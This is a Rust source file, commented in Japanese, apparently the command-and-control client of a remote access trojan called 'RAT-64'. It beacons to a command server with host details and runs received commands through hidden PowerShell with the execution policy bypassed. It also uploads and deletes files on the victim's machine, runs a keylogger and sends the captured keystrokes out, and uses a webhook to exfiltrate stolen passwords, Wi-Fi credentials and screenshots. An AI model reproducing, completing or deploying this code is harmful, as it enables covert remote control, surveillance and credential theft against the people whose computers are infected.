// C2 (Command and Control) クライアントモジュール
use serde::{Deserialize, Serialize};
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use tokio::time;
use rand::RngCore;
use crate::collectors::system_info::get_system_info_async;

use crate::core::config::Config;
use crate::IntegratedPayload;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ClientCommandType {
    Execute,
    ListFiles,
    GetFileInfo,
    DownloadFile,
    DeleteFile,
    CreateDir,
    KeylogStart,
    KeylogStop,
    KeylogStatus,
    KeylogDownload,
    UpdateSystemInfo,
    WebhookSend,
}

impl ClientCommandType {
    fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            // main execution
            "execute" | "exec" | "cmd" | "command" | "run" | "execute_debug_command" =>
                Some(Self::Execute),
            // file ops
            "list_files" | "ls" | "dir" => Some(Self::ListFiles),
            "get_file_info" | "fileinfo" | "stat" => Some(Self::GetFileInfo),
            "download_file" | "download" | "get" => Some(Self::DownloadFile),
            "delete_file" | "rm" | "del" => Some(Self::DeleteFile),
            "create_dir" | "mkdir" | "md" => Some(Self::CreateDir),
            // keylogger
            "keylog_start" | "keylog" | "kl_start" => Some(Self::KeylogStart),
            "keylog_stop" | "kl_stop" => Some(Self::KeylogStop),
            "keylog_status" | "kl_status" => Some(Self::KeylogStatus),
            "keylog_download" | "kl_download" => Some(Self::KeylogDownload),
            // system info
            "update_system_info" | "sysinfo" | "update_sysinfo" => Some(Self::UpdateSystemInfo),
            // webhook
            "webhook_send" | "webhook" | "send_webhook" => Some(Self::WebhookSend),
            _ => None,
        }
    }
}



#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ServerCommand {
    pub id: String,
    pub command_type: String,
    pub parameters: Vec<String>,
    pub timestamp: u64,
    pub auth_token: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct CommandResponse {
    pub client_id: String,
    pub command_id: String,
    pub success: bool,
    pub message: String,
    pub data: Option<serde_json::Value>,
    pub timestamp: u64,
    pub execution_time_ms: u64,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct HeartbeatRequest {
    pub client_id: String,
    pub hostname: String,
    pub status: String,
    pub system_info: Option<serde_json::Value>,
    pub timestamp: u64,
    pub auth_token: String,
}

pub struct C2Client {
    config: Config,
    client_id: String,
    is_active: bool,
    keylogger_active: bool,
    keylogger_duration: Option<u32>, // キーロガーの実行時間（ms）
    initial_registration_done: bool, // 初回登録済みフラグ
}

impl C2Client {
    pub fn new(config: Config) -> Self {
        let client_id = format!(
            "rat64_{}",
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs()
        );
        // 設定は引数の値（またはデフォルト）をそのまま使用
        Self {
            config,
            client_id,
            is_active: false,
            keylogger_active: false,
            keylogger_duration: None,
            initial_registration_done: false,
        }
    }

    /// C2通信を開始して待機状態に移行
    pub async fn start_c2_loop(&mut self) -> Result<(), String> {
        // サイレント起動

        self.is_active = true;

        // 初回ハートビート送信
        println!(
            "📡 Sending initial heartbeat to {}...",
            self.config.command_server_url
        );
        match self.send_heartbeat("online").await {
            Ok(()) => {
                println!("✅ C2 server connected successfully");
                println!(
                    "💓 Heartbeat established with {}",
                    self.config.command_server_url
                );
            }
            Err(e) => {
                println!("⚠️  Initial heartbeat failed: {}", e);
                println!("🔄 Continuing in offline mode, will retry periodically");
            }
        }

        println!(
            "🔄 Entering C2 standby (heartbeat {}s, poll {}s)...",
            self.config.heartbeat_interval_seconds, self.config.command_poll_interval_seconds
        );

        let mut hb_interval = time::interval(Duration::from_secs(
            self.config.heartbeat_interval_seconds.max(1),
        ));
        let mut poll_interval = time::interval(Duration::from_secs(
            self.config.command_poll_interval_seconds.max(1),
        ));

        loop {
            tokio::select! {
                _ = hb_interval.tick() => {
                    let _ = self.send_heartbeat("standby").await;
                }
                _ = poll_interval.tick() => {
                    self.process_c2_cycle().await;
                }
                _ = tokio::signal::ctrl_c() => {
                    println!("🛑 C2 shutdown signal received");
                    break;
                }
            }
        }

        self.is_active = false;
        println!("📡 Sending offline heartbeat...");
        let _ = self.send_heartbeat("offline").await;
        println!("🌐 C2 Client shutdown complete");
        Ok(())
    }

    /// 1回のC2サイクルを処理
    async fn process_c2_cycle(&mut self) {
        // サーバーコマンドのチェックと実行
        if let Ok(command_count) = self.check_and_execute_commands().await {
            if command_count > 0 {
                println!("⚡ Executed {} command(s)", command_count);
            }
        }
    }

    /// サーバーからコマンドをチェックして実行（DRY化・効率化）
    async fn check_and_execute_commands(&mut self) -> Result<usize, String> {
        let commands = self
            .fetch_commands()
            .await
            .map_err(|e| format!("Failed to fetch commands: {}", e))?;
        let mut executed_count = 0;

        for command in commands {
            match self.execute_command(command).await {
                Ok(response) => {
                    if let Err(e) = self.send_command_response(&response).await {
                        eprintln!("🌐 Failed to send command response: {}", e);
                    }
                    executed_count += 1;
                }
                Err(e) => {
                    eprintln!("🌐 Command execution failed: {}", e);
                }
            }
        }

        Ok(executed_count)
    }

    /// 共通: 既定ヘッダの付与
    fn with_defaults(&self, req: minreq::Request) -> minreq::Request {
        req.with_header(
            "Authorization",
            format!("Bearer {}", self.config.command_auth_token),
        )
        .with_header("User-Agent", "RAT-64-HttpClient/1.0")
        .with_timeout(self.config.timeout_seconds)
    }

    /// サーバーからコマンドを取得（シンプルポーリング）
    async fn fetch_commands(&self) -> Result<Vec<ServerCommand>, Box<dyn std::error::Error>> {
        let url = format!(
            "{}/api/commands/fetch?client_id={}",
            self.config.command_server_url, self.client_id
        );

        let response = self.with_defaults(minreq::get(&url)).send()?;

        if response.status_code != 200 {
            return Ok(Vec::new()); // コマンドがない場合は空のベクターを返す
        }

        let response_text = response.as_str()?;
        let commands: Vec<ServerCommand> = serde_json::from_str(response_text)?;

        Ok(commands)
    }

    async fn execute_command(&mut self, command: ServerCommand) -> Result<CommandResponse, String> {
        let start_time = std::time::Instant::now();

        if command.auth_token != self.config.command_auth_token {
            return Err(format!(
                "Authentication failed: expected '{}', got '{}'",
                self.config.command_auth_token, command.auth_token
            ));
        }

        println!(
            "📨 Received command: {} (ID: {})",
            command.command_type, command.id
        );

        let result = match ClientCommandType::from_str(&command.command_type) {
            Some(ClientCommandType::Execute) => {
                self.handle_command_execution(&command.parameters).await
            }
            Some(ClientCommandType::ListFiles) => {
                self.handle_list_files_command(&command.parameters).await
            }
            Some(ClientCommandType::GetFileInfo) => {
                self.handle_get_file_info_command(&command.parameters).await
            }
            Some(ClientCommandType::DownloadFile) => {
                self.handle_download_file_command(&command.parameters).await
            }
            Some(ClientCommandType::DeleteFile) => {
                self.handle_delete_file_command(&command.parameters).await
            }
            Some(ClientCommandType::CreateDir) => {
                self.handle_create_dir_command(&command.parameters).await
            }
            Some(ClientCommandType::KeylogStart) => {
                self.handle_keylog_start_command(&command.parameters).await
            }
            Some(ClientCommandType::KeylogStop) => self.handle_keylog_stop_command().await,
            Some(ClientCommandType::KeylogStatus) => self.handle_keylog_status_command().await,
            Some(ClientCommandType::KeylogDownload) => {
                self.handle_keylog_download_command(&command.parameters).await
            }
            Some(ClientCommandType::UpdateSystemInfo) => {
                self.handle_update_system_info_command().await
            }
            Some(ClientCommandType::WebhookSend) => {
                self.handle_webhook_send_command(&command.parameters).await
            }
            None => Err(format!("Unknown command type: {}", command.command_type)),
        };

        let execution_time = start_time.elapsed().as_millis() as u64;
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();

        let response = match result {
            Ok((message, data)) => CommandResponse {
                client_id: self.client_id.clone(),
                command_id: command.id,
                success: true,
                message,
                data,
                timestamp,
                execution_time_ms: execution_time,
            },
            Err(e) => CommandResponse {
                client_id: self.client_id.clone(),
                command_id: command.id,
                success: false,
                message: e.to_string(),
                data: None,
                timestamp,
                execution_time_ms: execution_time,
            },
        };

        Ok(response)
    }

    /// コマンドレスポンスをサーバーに送信
    async fn send_command_response(
        &self,
        response: &CommandResponse,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let url = format!("{}/api/commands/response", self.config.command_server_url);

        println!("📤 Sending command response to: {}", url);
        println!("   Command ID: {}", response.command_id);
        println!("   Success: {}", response.success);
        println!("   Message: {}", response.message);

        let json_body = serde_json::to_string(response)?;
        println!("   Payload size: {} bytes", json_body.len());

        let http_response = self
            .with_defaults(
                minreq::post(&url)
                    .with_header("Content-Type", "application/json")
                    .with_body(json_body),
            )
            .send()?;

        if http_response.status_code >= 200 && http_response.status_code < 300 {
            println!(
                "✅ Command response sent successfully (HTTP {})",
                http_response.status_code
            );
            Ok(())
        } else {
            let error_msg = format!(
                "Server response failed: HTTP {} - {}",
                http_response.status_code,
                http_response.as_str().unwrap_or("no body")
            );
            println!("❌ {}", error_msg);
            Err(error_msg.into())
        }
    }

    /// ハートビートをサーバーに送信
    async fn send_heartbeat(&mut self, status: &str) -> Result<(), Box<dyn std::error::Error>> {
        let url = format!("{}/api/heartbeat", self.config.command_server_url);

        // システム情報は初回登録時のみ送信
        let system_info = if !self.initial_registration_done {
            println!("📊 Collecting system info for initial registration...");
            match get_system_info_async().await {
                Ok(info) => {
                    self.initial_registration_done = true;
                    let system_info_json = serde_json::to_value(info)?;
                    println!("✅ System info collected and will be sent");
                    Some(system_info_json)
                },
                Err(e) => {
                    println!("❌ Failed to collect system info: {}", e);
                    None
                },
            }
        } else {
            println!("⚪ Skipping system info (already registered)");
            None
        };

        let heartbeat = HeartbeatRequest {
            client_id: self.client_id.clone(),
            hostname: std::env::var("COMPUTERNAME")
                .or_else(|_| std::env::var("HOSTNAME"))
                .unwrap_or_else(|_| "Unknown".to_string()),
            status: status.to_string(),
            system_info,
            timestamp: SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
            auth_token: self.config.command_auth_token.clone(),
        };

        let response = self
            .with_defaults(
                minreq::post(&url)
                    .with_header("Content-Type", "application/json")
                    .with_body(serde_json::to_string(&heartbeat)?),
            )
            .send()?;

        if response.status_code >= 200 && response.status_code < 300 {
            Ok(())
        } else {
            Err(format!("Heartbeat failed: HTTP {}", response.status_code).into())
        }
    }

    /// 収集したデータをサーバーにアップロード
    pub async fn upload_collected_data(
        &self,
        payload: &IntegratedPayload,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let url = format!("{}/api/data/upload", self.config.command_server_url);
        let body = serde_json::json!({
            "client_id": self.client_id,
            "data_type": "integrated_payload",
            "payload": payload,
        });

        let response = self
            .with_defaults(
                minreq::post(&url)
                    .with_header("Content-Type", "application/json")
                    .with_body(serde_json::to_string(&body)?),
            )
            .send()?;

        if response.status_code >= 200 && response.status_code < 300 {
            Ok(())
        } else {
            Err(format!("Data upload failed: HTTP {}", response.status_code).into())
        }
    }

    // ========== メインコマンドハンドラー ==========

    // ========== ファイル管理コマンド ==========

    /// ディレクトリ一覧取得
    async fn handle_list_files_command(
        &self,
        params: &[String],
    ) -> Result<(String, Option<serde_json::Value>), String> {
        let path = params.get(0).map(|s| s.as_str()).unwrap_or(".");
        let show_hidden = params.get(1).map(|s| s == "true").unwrap_or(false);

        match std::fs::read_dir(path) {
            Ok(entries) => {
                let mut files = Vec::new();
                for entry in entries {
                    if let Ok(entry) = entry {
                        let metadata = entry.metadata().ok();
                        let name = entry.file_name().to_string_lossy().to_string();

                        // 隠しファイルのフィルタリング
                        if !show_hidden && (name.starts_with('.') || name.starts_with('~')) {
                            continue;
                        }

                        let file_info = serde_json::json!({
                            "name": name,
                            "path": entry.path().to_string_lossy(),
                            "is_dir": metadata.as_ref().map(|m| m.is_dir()).unwrap_or(false),
                            "is_file": metadata.as_ref().map(|m| m.is_file()).unwrap_or(false),
                            "size": metadata.as_ref().map(|m| m.len()).unwrap_or(0),
                            "modified": metadata.as_ref().and_then(|m|
                                m.modified().ok().and_then(|t|
                                    t.duration_since(UNIX_EPOCH).ok().map(|d| d.as_secs()))),
                        });

                        files.push(file_info);
                    }
                }

                // ディレクトリ優先でソート
                files.sort_by(|a, b| {
                    let a_is_dir = a.get("is_dir").and_then(|v| v.as_bool()).unwrap_or(false);
                    let b_is_dir = b.get("is_dir").and_then(|v| v.as_bool()).unwrap_or(false);

                    match (a_is_dir, b_is_dir) {
                        (true, false) => std::cmp::Ordering::Less,
                        (false, true) => std::cmp::Ordering::Greater,
                        _ => a
                            .get("name")
                            .and_then(|v| v.as_str())
                            .cmp(&b.get("name").and_then(|v| v.as_str())),
                    }
                });

                let result = serde_json::json!({
                    "path": path,
                    "files": files,
                    "count": files.len(),
                    "show_hidden": show_hidden
                });

                Ok((
                    format!("Listed {} files in '{}'", files.len(), path),
                    Some(result),
                ))
            }
            Err(e) => Err(format!("Failed to list directory '{}': {}", path, e)),
        }
    }

    /// ファイル情報取得
    async fn handle_get_file_info_command(
        &self,
        params: &[String],
    ) -> Result<(String, Option<serde_json::Value>), String> {
        let file_path = params.get(0).ok_or("File path parameter required")?;

        match std::fs::metadata(file_path) {
            Ok(metadata) => {
                let file_info = serde_json::json!({
                    "path": file_path,
                    "name": std::path::Path::new(file_path).file_name()
                        .and_then(|n| n.to_str()).unwrap_or("unknown"),
                    "is_dir": metadata.is_dir(),
                    "is_file": metadata.is_file(),
                    "size": metadata.len(),
                    "readonly": metadata.permissions().readonly(),
                    "created": metadata.created().ok().and_then(|t|
                        t.duration_since(UNIX_EPOCH).ok().map(|d| d.as_secs())),
                    "modified": metadata.modified().ok().and_then(|t|
                        t.duration_since(UNIX_EPOCH).ok().map(|d| d.as_secs())),
                    "accessed": metadata.accessed().ok().and_then(|t|
                        t.duration_since(UNIX_EPOCH).ok().map(|d| d.as_secs())),
                });

                Ok((format!("File info for '{}'", file_path), Some(file_info)))
            }
            Err(e) => Err(format!(
                "Failed to get file info for '{}': {}",
                file_path, e
            )),
        }
    }

    /// ファイルダウンロード（サーバーに送信）
    async fn handle_download_file_command(
        &self,
        params: &[String],
    ) -> Result<(String, Option<serde_json::Value>), String> {
        let file_path = params.get(0).ok_or("File path parameter required")?;
        let max_size = params
            .get(1)
            .and_then(|s| s.parse::<u64>().ok())
            .unwrap_or(10 * 1024 * 1024); // デフォルト10MB制限

        // ファイルサイズ確認
        let metadata = std::fs::metadata(file_path)
            .map_err(|e| format!("File '{}' not found: {}", file_path, e))?;

        if metadata.len() > max_size {
            return Err(format!(
                "File too large: {} bytes (max: {} bytes)",
                metadata.len(),
                max_size
            ));
        }

        if metadata.is_dir() {
            return Err(format!("'{}' is a directory, not a file", file_path));
        }

        match std::fs::read(file_path) {
            Ok(file_data) => {
                // Base64エンコード
                use base64::{engine::general_purpose, Engine as _};
                let encoded_data = general_purpose::STANDARD.encode(&file_data);

                let file_info = serde_json::json!({
                    "file_path": file_path,
                    "file_name": std::path::Path::new(file_path).file_name()
                        .and_then(|n| n.to_str()).unwrap_or("unknown"),
                    "size": file_data.len(),
                    "data": encoded_data,
                    "encoding": "base64",
                    "content_type": "application/octet-stream"
                });

                Ok((
                    format!(
                        "File '{}' downloaded ({} bytes)",
                        file_path,
                        file_data.len()
                    ),
                    Some(file_info),
                ))
            }
            Err(e) => Err(format!("Failed to read file '{}': {}", file_path, e)),
        }
    }

    /// ファイル削除
    async fn handle_delete_file_command(
        &self,
        params: &[String],
    ) -> Result<(String, Option<serde_json::Value>), String> {
        let file_path = params.get(0).ok_or("File path parameter required")?;
        let force = params.get(1).map(|s| s == "true").unwrap_or(false);

        let metadata = std::fs::metadata(file_path)
            .map_err(|e| format!("File '{}' not found: {}", file_path, e))?;

        let result = if metadata.is_dir() {
            if force {
                std::fs::remove_dir_all(file_path)
            } else {
                std::fs::remove_dir(file_path)
            }
        } else {
            std::fs::remove_file(file_path)
        };

        match result {
            Ok(()) => {
                let info = serde_json::json!({
                    "path": file_path,
                    "type": if metadata.is_dir() { "directory" } else { "file" },
                    "status": "deleted",
                    "force": force
                });
                Ok((
                    format!(
                        "Deleted {} '{}'",
                        if metadata.is_dir() {
                            "directory"
                        } else {
                            "file"
                        },
                        file_path
                    ),
                    Some(info),
                ))
            }
            Err(e) => Err(format!("Failed to delete '{}': {}", file_path, e)),
        }
    }

    /// ディレクトリ作成
    async fn handle_create_dir_command(
        &self,
        params: &[String],
    ) -> Result<(String, Option<serde_json::Value>), String> {
        let dir_path = params.get(0).ok_or("Directory path parameter required")?;
        let recursive = params.get(1).map(|s| s == "true").unwrap_or(false);

        let result = if recursive {
            std::fs::create_dir_all(dir_path)
        } else {
            std::fs::create_dir(dir_path)
        };

        match result {
            Ok(()) => {
                let info = serde_json::json!({
                    "path": dir_path,
                    "recursive": recursive,
                    "status": "created"
                });
                Ok((format!("Directory created: '{}'", dir_path), Some(info)))
            }
            Err(e) => Err(format!("Failed to create directory '{}': {}", dir_path, e)),
        }
    }

    /// デバッグコマンド実行
    async fn handle_command_execution(
        &self,
        params: &[String],
    ) -> Result<(String, Option<serde_json::Value>), String> {
        let command = params.get(0).ok_or("Command parameter required")?;
        let default_timeout = "30".to_string();
        let default_workdir = "".to_string();
        let timeout_str = params.get(1).unwrap_or(&default_timeout);
        let working_dir = params.get(2).unwrap_or(&default_workdir);

        let timeout = timeout_str.parse::<u64>().unwrap_or(30);



        // 通常のコマンド実行
        self.execute_powershell_command(command, timeout, working_dir).await
    }





    /// PowerShellコマンド実行
    async fn execute_powershell_command(
        &self,
        command: &str,
        timeout: u64,
        working_dir: &str,
    ) -> Result<(String, Option<serde_json::Value>), String> {
        println!("🚀 Executing PowerShell command: {}", command);
        
        let start_time = std::time::Instant::now();
        
        let mut cmd = std::process::Command::new("powershell");
        
        cmd.args(&[
            "-WindowStyle", "Hidden",
            "-ExecutionPolicy", "Bypass", 
            "-NoProfile",
            "-NonInteractive",
            "-Command", 
            command
        ]);
        
        if !working_dir.is_empty() {
            cmd.current_dir(working_dir);
        }
        
        cmd.stdout(std::process::Stdio::piped());
        cmd.stderr(std::process::Stdio::piped());
        
        let output = match tokio::time::timeout(
            Duration::from_secs(timeout),
            tokio::task::spawn_blocking(move || cmd.output()),
        ).await {
            Ok(Ok(Ok(output))) => output,
            Ok(Ok(Err(e))) => {
                return Err(format!("Command execution failed: {}", e));
            }
            Ok(Err(_)) => {
                return Err("Command task panicked".to_string());
            }
            Err(_) => {
                return Err(format!("Command timed out after {} seconds", timeout));
            }
        };
        
        let execution_time = start_time.elapsed().as_millis() as u64;
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);
        let exit_code = output.status.code().unwrap_or(-1);
        
        let result_data = serde_json::json!({
            "command": command,
            "working_dir": working_dir,
            "timeout": timeout,
            "exit_code": exit_code,
            "stdout": stdout.as_ref(),
            "stderr": stderr.as_ref(),
            "execution_time_ms": execution_time,
            "success": output.status.success()
        });
        
        if output.status.success() {
            println!("✅ Command executed successfully ({}ms)", execution_time);
            Ok((
                format!("Command executed successfully ({}ms)", execution_time),
                Some(result_data),
            ))
        } else {
            println!("❌ Command failed (exit code: {})", exit_code);
            if !stderr.is_empty() {
                println!("   Error: {}", stderr.trim());
            }
            Ok((
                format!("Command failed with exit code {} ({}ms)", exit_code, execution_time),
                Some(result_data),
            ))
        }
    }

    // キーロガーコマンドハンドラー
    #[cfg(windows)]
    async fn handle_keylog_start_command(
        &mut self,
        parameters: &[String],
    ) -> Result<(String, Option<serde_json::Value>), String> {
        use crate::collectors::key_mouse_logger::{
            collect_input_events_structured, save_session_to_file,
        };

        if self.keylogger_active {
            return Ok(("Keylogger is already active".to_string(), None));
        }

        let duration = if parameters.is_empty() {
            30000 // デフォルト30秒
        } else {
            parameters[0].parse::<u32>().unwrap_or(30000)
        };

        self.keylogger_active = true;
        self.keylogger_duration = Some(duration);

        println!("🎯 Starting keylogger for {} seconds", duration / 1000);

        // バックグラウンドでキーロガーを実行
        let events = tokio::task::spawn_blocking(move || collect_input_events_structured(duration))
            .await
            .map_err(|e| format!("Failed to start keylogger: {}", e))?;

        // セッションを保存
        let _ = save_session_to_file();

        self.keylogger_active = false;
        self.keylogger_duration = None;

        let result_data = serde_json::json!({
            "events_captured": events.len(),
            "duration_ms": duration,
            "session_saved": true
        });

        Ok((
            format!("Keylogger completed: {} events captured", events.len()),
            Some(result_data),
        ))
    }

    #[cfg(not(windows))]
    async fn handle_keylog_start_command(
        &mut self,
        _parameters: &[String],
    ) -> Result<(String, Option<serde_json::Value>), String> {
        Err("Keylogger is not supported on non-Windows platforms".to_string())
    }

    async fn handle_keylog_stop_command(
        &mut self,
    ) -> Result<(String, Option<serde_json::Value>), String> {
        if !self.keylogger_active {
            return Ok(("Keylogger is not currently active".to_string(), None));
        }

        self.keylogger_active = false;
        self.keylogger_duration = None;

        Ok(("Keylogger stopped".to_string(), None))
    }

    async fn handle_keylog_status_command(
        &self,
    ) -> Result<(String, Option<serde_json::Value>), String> {
        let status_data = serde_json::json!({
            "active": self.keylogger_active,
            "duration_ms": self.keylogger_duration,
        });

        let status_msg = if self.keylogger_active {
            format!(
                "Keylogger is active ({}ms remaining)",
                self.keylogger_duration.unwrap_or(0)
            )
        } else {
            "Keylogger is inactive".to_string()
        };

        Ok((status_msg, Some(status_data)))
    }

    #[cfg(windows)]
    async fn handle_keylog_download_command(
        &self,
        parameters: &[String],
    ) -> Result<(String, Option<serde_json::Value>), String> {
        use crate::collectors::key_mouse_logger::{
            get_daily_logs, get_statistics, load_session_from_file,
        };
        use std::fs;

        let log_type = parameters.get(0).map(|s| s.as_str()).unwrap_or("session");

        let (events, log_info) = match log_type {
            "session" => {
                let events = load_session_from_file();
                (events, "Current session log".to_string())
            }
            "daily" => {
                let date = parameters
                    .get(1)
                    .unwrap_or(&"2025-10-05".to_string())
                    .clone();
                let events = get_daily_logs(&date);
                (events, format!("Daily log for {}", date))
            }
            _ => return Err("Invalid log type. Use 'session' or 'daily'".to_string()),
        };

        let stats = get_statistics();

        // ログファイルの存在確認
        let session_file_exists = fs::metadata("keylog_session.json").is_ok();

        let result_data = serde_json::json!({
            "log_type": log_type,
            "log_info": log_info,
            "events_count": events.len(),
            "events": events,
            "statistics": stats,
            "session_file_exists": session_file_exists
        });

        Ok((
            format!("{}: {} events available", log_info, events.len()),
            Some(result_data),
        ))
    }

    #[cfg(not(windows))]
    async fn handle_keylog_download_command(
        &self,
        _parameters: &[String],
    ) -> Result<(String, Option<serde_json::Value>), String> {
        Err("Keylogger is not supported on non-Windows platforms".to_string())
    }

    /// システム情報更新コマンドの処理
    async fn handle_update_system_info_command(
        &self,
    ) -> Result<(String, Option<serde_json::Value>), String> {
        match get_system_info_async().await {
            Ok(system_info) => {
                let system_info_json = serde_json::to_value(&system_info)
                    .map_err(|e| format!("Failed to serialize system info: {}", e))?;
                
                Ok((
                    "System information updated successfully".to_string(),
                    Some(system_info_json),
                ))
            }
            Err(e) => Err(format!("Failed to get system information: {}", e)),
        }
    }

    /// Webhook送信コマンドの処理
    async fn handle_webhook_send_command(
        &self,
        _parameters: &[String],
    ) -> Result<(String, Option<serde_json::Value>), String> {
        // 設定検証
        if !self.config.webhook_enabled {
            return Err("Webhook is disabled in configuration".to_string());
        }
        if self.config.webhook_url.trim().is_empty() {
            return Err("Webhook URL is not configured".to_string());
        }

        // perform_initial_data_collection と同じ統合ペイロードを作成
        #[cfg(windows)]
        {
            let mut payload = crate::IntegratedPayload::create_with_config(&self.config)
                .await
                .map_err(|e| format!("Failed to build payload: {}", e))?;

            // main.rs と同様にキー/ノンスを生成してペイロードに反映
            let mut key = [0u8; 32];
            let mut nonce = [0u8; 12];
            rand::rng().fill_bytes(&mut key);
            rand::rng().fill_bytes(&mut nonce);
            payload.update_encryption_info(&key, &nonce);

            // 統一WebHook送信（lib.rs と同一実装）
            crate::send_unified_webhook(&payload, &self.config)
                .await
                .map_err(|e| format!("Failed to send webhook: {}", e))?;

            let summary = serde_json::json!({
                "webhook_type": self.config.webhook_type,
                "system_info": {
                    "hostname": payload.system_info.hostname,
                    "username": payload.system_info.username,
                    "os": format!("{} {}", payload.system_info.os_name, payload.system_info.os_version),
                },
                "counts": {
                    "passwords": payload.auth_data.passwords.len(),
                    "wifi": payload.auth_data.wifi_creds.len(),
                    "screenshots": payload.screenshot_data.as_ref().map(|s| s.total_count).unwrap_or(0)
                }
            });

            Ok((
                format!(
                    "Webhook sent with integrated payload (type: {})",
                    self.config.webhook_type
                ),
                Some(summary),
            ))
        }
        #[cfg(not(windows))]
        {
            Err("Webhook with integrated payload is supported only on Windows".to_string())
        }
    }
}
